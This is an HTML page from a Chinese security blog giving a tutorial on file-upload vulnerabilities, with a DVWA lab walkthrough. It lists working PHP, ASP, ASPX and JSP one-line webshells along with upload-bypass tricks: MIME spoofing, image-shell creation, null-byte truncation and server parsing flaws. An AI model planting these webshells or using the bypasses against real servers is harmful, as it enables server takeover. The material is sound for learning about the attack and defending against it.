@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>web安全-文件上传 | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="web安全">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>web安全-文件上传</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">web安全-文件上传</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-02-03T15:17:07.939Z" itemprop="datePublished" class="page-time">
+  2021-02-03
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-文件上传"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">web安全-文件上传</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-02-03 23:17:07" datetime="2021-02-03T15:17:07.939Z"  itemprop="datePublished">2021-02-03</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>Author:<code>wisejay</code></p>
+<p>Email:<code>wisejay@foxmail.com</code></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件，网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。</p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><strong>定义</strong></p>
+<p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
+<p><strong>特点</strong></p>
+<p>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测。<?php eval($_POST[a]); ?>就是一个最常见最原始的小马。 </p>
+<h2 id="校验方法"><a href="#校验方法" class="headerlink" title="校验方法"></a>校验方法</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ol>
+<li><p>通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式</p>
+</li>
+<li><p>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
+</li>
+</ol>
+<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><ol>
+<li>校验请求头 content-type字段MIME类型<ul>
+<li>例如用PHP检测<code>if($_FILES[&#39;FILE&#39;][&#39;TYPE&#39;]!= &quot;image/gif&quot;){}</code></li>
+</ul>
+</li>
+<li>文件内容加载检测：一般是调用API或函数去进行文件加载测试，例如图像渲染测试，当测试结果正常的时候才允许上传<ul>
+<li>一次渲染：例如用PHP检测<code>if(!getimagesize($_FILES[&#39;FILE&#39;][&#39;tmp_name&#39;])){}</code></li>
+</ul>
+</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+</ol>
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h3><ul>
+<li>删除浏览器事件(或禁用JS)</li>
+<li>利用burpsuite抓包修改后缀名</li>
+<li>构造上传表单</li>
+</ul>
+<h3 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h3><p><strong>后缀名绕过</strong></p>
+<ul>
+<li>大小写绕过</li>
+<li>名单列表绕过<ul>
+<li>常见<code>php</code>、<code>php3</code>、<code>phtml</code></li>
+</ul>
+</li>
+<li>windows特性<ul>
+<li>末尾的点(.)：如<code>[1.php.]</code></li>
+<li>空格( )：如<code>[1.php ]</code></li>
+<li>::$DATA：如<code>[1.php::$DATA]</code></li>
+</ul>
+</li>
+<li>.hatccess文件攻击</li>
+<li>利用Apache文件解析</li>
+</ul>
+<p><strong>MIME绕过</strong></p>
+<ul>
+<li>抓包修改Content-Type的值<ul>
+<li><code>.js</code> : <code>application/x-javascript</code></li>
+<li><code>.html</code> : <code>text/html</code></li>
+<li><code>.jpg</code>: <code>image/jpeg</code></li>
+<li><code>.png</code> : <code>image/png</code></li>
+<li><code>.pdf</code>:  <code>application/pdf</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>文件内容绕过</strong></p>
+<ul>
+<li>在脚本文件开头补充图片对应的头部值<ul>
+<li>JPG : <code>FF D8 FF E0 00 10 4A 46 49 46</code></li>
+<li>GIF : <code>47 49 46 38 39 61</code></li>
+<li>PNG : <code>89 50 4E 47</code></li>
+</ul>
+</li>
+<li>二次渲染绕过<ul>
+<li>先上传图片，然后下来回来查看在没有改变的插入一句话木马</li>
+</ul>
+</li>
+<li>制作图片马<code>copy 1.jpg/b+1.php/a 2.jpg</code><ul>
+<li>/b以二进制格式复制，合并文件，用于图像类/声音类</li>
+<li>/a以ASCII格式复制，合并文件，用于txt等文档类文件</li>
+<li><strong>图片马需要结合文件包含或者容器解析漏洞才能利用</strong></li>
+</ul>
+</li>
+</ul>
+<p><strong>00截断绕过</strong></p>
+<ul>
+<li>00代表结束符，PHP会把00后面的所有字符删除<ul>
+<li>PHP版本小于5.3.4、<code>magic_quotes_gpc</code>为OFF</li>
+<li>GET请求方式%00是被服务器解码为0x00发挥了截断作用</li>
+<li>POST请求可以先用特殊符号代替，然后抓包查看修改为00</li>
+</ul>
+</li>
+</ul>
+<p><strong>条件竞争绕过</strong></p>
+<ul>
+<li>一些网站文件检测逻辑是先允许上传任意文件，然后检查文件是否包含可执行脚本，如果包含就删除。这样我们可以利用成功上传到删除文件的时间差，上传一个.php文件，在没有删除之前立即访问，则自动生成一个新的<code>shell.php</code>，新文件不会被删除。</li>
+</ul>
+<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS解析漏洞-IIS-5-X-6-0"><a href="#IIS解析漏洞-IIS-5-X-6-0" class="headerlink" title="IIS解析漏洞(IIS 5.X/6.0)"></a>IIS解析漏洞(IIS 5.X/6.0)</h3><ul>
+<li><p>目录解析：<code>/test.asp/1.jsp</code>解析为<code>1.asp</code></p>
+<ul>
+<li>在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行</li>
+</ul>
+</li>
+<li><p>文件解析：<code>test.asp;.jpg</code> 解析为<code>test.asp</code></p>
+<ul>
+<li>分号后面的不被解析</li>
+</ul>
+</li>
+</ul>
+<h3 id="Nginx解析漏洞-IIS-7-0-IIS-7-5-Nginx-lt-8-03"><a href="#Nginx解析漏洞-IIS-7-0-IIS-7-5-Nginx-lt-8-03" class="headerlink" title="Nginx解析漏洞(IIS 7.0/IIS 7.5/Nginx &lt;8.03)"></a>Nginx解析漏洞(IIS 7.0/IIS 7.5/Nginx &lt;8.03)</h3><ul>
+<li><p>在默认Fast-CGI开启状况上传一个名字为1.jpg访问1.jpg/1.php,在这个目录下就会生成一句话木马 shell.php</p>
+<ul>
+<li><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></li>
+</ul>
+</li>
+<li><p><code>%00</code>截断：<code>test.jpg%00.php</code>解析为<code>test.php</code></p>
+</li>
+</ul>
+<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断</p>
+<ul>
+<li>当请求<code>shell.php.xxx.yyy</code><ul>
+<li><code>yyy</code>后缀无法识别，向左</li>
+<li><code>xxx</code>后缀无法识别，向左</li>
+<li>php可以识别，执行<code>shell.php</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="一句话木马制作"><a href="#一句话木马制作" class="headerlink" title="一句话木马制作"></a>一句话木马制作</h3><ul>
+<li>PHP<ul>
+<li>eval函数<ul>
+<li><code>&lt;?PHP eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code></li>
+<li><code>&lt;?PHP eval($_POST[&#39;cmd&#39;]);?&gt;</code></li>
+<li><code>&lt;?PHP @eval($_POST[&#39;cmd&#39;]);?&gt;</code></li>
+</ul>
+</li>
+<li>system函数<ul>
+<li><code>&lt;?PHP system($_REQUEST[&#39;cmd&#39;]);?&gt;</code></li>
+<li><code>&lt;?PHP system($_POST[&#39;cmd&#39;]);?&gt;</code></li>
+</ul>
+</li>
+<li>shell_exec函数<ul>
+<li><code>&lt;?PHP echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li>
+</ul>
+</li>
+<li>assert函数<ul>
+<li><code>&lt;?php @assert($_POST[&#39;cmd&#39;]);?&gt;</code></li>
+<li><code>&lt;?php $item[&#39;wind&#39;] = &#39;assert&#39;; $array[] = $item; $array[0][&#39;wind&#39;](/img/文件上传/$_POST[&#39;cmd&#39;]);?&gt;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>ASP<ul>
+<li>execute函数<ul>
+<li><code>&lt;%execute(request(&quot;cmd&quot;))%&gt;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>ASPX<ul>
+<li><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%&gt;</code></li>
+</ul>
+</li>
+<li>JSP<ul>
+<li><code>&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h3><figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598022121925.png" title="1598022121925" data-fancybox="images"><img src="/img/文件上传/1598022121925.png" alt="1598022121925" title class></a>
+                <p>1598022121925</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598024239309.png" title="1598024239309" data-fancybox="images"><img src="/img/文件上传/1598024239309.png" alt="1598024239309" title class></a>
+                <p>1598024239309</p>
+            </figure>
+
+<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><blockquote>
+<p>直接上传一句话木马</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598012840997.png" title="1598012840997" data-fancybox="images"><img src="/img/文件上传/1598012840997.png" alt="1598012840997" title class></a>
+                <p>1598012840997</p>
+            </figure>
+
+<blockquote>
+<p>没有任何过滤直接上传成功并且返回文件保存的位置</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598012888770.png" title="1598012888770" data-fancybox="images"><img src="/img/文件上传/1598012888770.png" alt="1598012888770" title class></a>
+                <p>1598012888770</p>
+            </figure>
+
+<h3 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h3><blockquote>
+<p>我们依旧直接上传木马，发现无法上传要求图片格式</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598013148594.png" title="1598013148594" data-fancybox="images"><img src="/img/文件上传/1598013148594.png" alt="1598013148594" title class></a>
+                <p>1598013148594</p>
+            </figure>
+
+<blockquote>
+<p>这里我们抓包修改MIME类型后再发送，这样就成功绕过上传了我们的shell.php</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598018691754.png" title="1598018691754" data-fancybox="images"><img src="/img/文件上传/1598018691754.png" alt="1598018691754" title class></a>
+                <p>1598018691754</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598018776334.png" title="1598018776334" data-fancybox="images"><img src="/img/文件上传/1598018776334.png" alt="1598018776334" title class></a>
+                <p>1598018776334</p>
+            </figure>
+
+<h3 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h3><blockquote>
+<p>这里修改MIME类型也无法上传了，我们直接制作图片马上传就成功了</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598019286315.png" title="1598019286315" data-fancybox="images"><img src="/img/文件上传/1598019286315.png" alt="1598019286315" title class></a>
+                <p>1598019286315</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-文件上传 href="/img/文件上传/1598019313281.png" title="1598019313281" data-fancybox="images"><img src="/img/文件上传/1598019313281.png" alt="1598019313281" title class></a>
+                <p>1598019313281</p>
+            </figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>文件上传的目录设置为不可执行 </li>
+<li>使用随机数改写文件名和文件路径</li>
+<li>最小权限运行Web服务</li>
+</ol>
+<hr>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2021-02-03T15:18:10.948Z" itemprop="dateUpdated">2021-02-03 23:18:10</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2021/02/03/文件上传/" target="_blank" rel="external">http://wisejay.top/2021/02/03/文件上传/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.top">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/02/03/文件上传/&title=《web安全-文件上传》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/02/03/文件上传/&title=《web安全-文件上传》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2021/02/02/CSRF/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">web安全-CSRF</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#文件上传"><span class="post-toc-number">1.</span> <span class="post-toc-text">文件上传</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#webshell"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">webshell</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#校验方法"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">校验方法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#客户端"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">客户端</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#服务端"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">服务端</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过方法"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">绕过方法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#客户端绕过"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">客户端绕过</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#服务端绕过"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">服务端绕过</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解析漏洞"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">解析漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IIS解析漏洞-IIS-5-X-6-0"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">IIS解析漏洞(IIS 5.X/6.0)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nginx解析漏洞-IIS-7-0-IIS-7-5-Nginx-lt-8-03"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">Nginx解析漏洞(IIS 7.0/IIS 7.5/Nginx &lt;8.03)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Apache解析漏洞"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">Apache解析漏洞</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#工具使用"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">工具使用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#一句话木马制作"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">一句话木马制作</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#菜刀连接"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">菜刀连接</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场练习"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">靶场练习</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LOW"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">LOW</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MEDIUM"><span class="post-toc-number">1.6.2.</span> <span class="post-toc-text">MEDIUM</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#HIGH"><span class="post-toc-number">1.6.3.</span> <span class="post-toc-text">HIGH</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防御"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">防御</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2021
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/02/03/文件上传/&title=《web安全-文件上传》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/02/03/文件上传/&title=《web安全-文件上传》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACH0lEQVR42u3aQY4CMQwEQP7/6Vlpr6uBbgdWIqmcEBomrotx7Dwe8bp+16Nc1826e+ffZ968MDAwvpZxPV13GzzfLHmy3ffuGQwMjHMYSSjJykN/vkseGwYGBsbzMu4OmaTXFomBgYGRM/ICLg9ulrgxMDBOY+SlXgtI0vSsJMXAwDiH0Q4G/vPzB+cbGBgYX8K4yjUr9WYNuCIqDAyMrRkrB8jZVYl2FJrvjoGBsStjPeF++sgaNd0wMDC2ZszCaptf6yOEKEFjYGBsypil1OTCRH5MbXfEwMA4jdE+mpd6bRrN46knsRgYGNsx8v5VWwK2XcCcioGBsTcjPy7Oirb1tBtd+8DAwNiasZL4km/a9Jo07OoCEQMD48sZSet/5fs8rDylvvjfwMDA2Jqx8rktB9vLGS9SOQYGxgGMWfH3rkFCG9uLfiEGBsZ2jFlbbWnQWB5Qi+EEBgbG1oy2aFu5GJGn7GIGi4GBcQwjP9x+Ypw5KwqXzugYGBhfwmh/MGv9R8390fULDAyM0xhteh3e6ShruaIExMDA2JQx2zhvfrVH0xkVAwNjb8ZVrjbQJIHOrpq9mMRiYGBsxFgp2vLXJY259uoYBgbGaYz81e2QYCX0PEFjYGCcw1hv7n9uzICBgYGRM1Zgs2FA/lsMDAyMlUHmP6VdDAyMAxhteVdMR8urG/mlEAwMjHMY7WAgadkXJV0w4Gzfj4GBsRHjB0CLzFLkKPUfAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
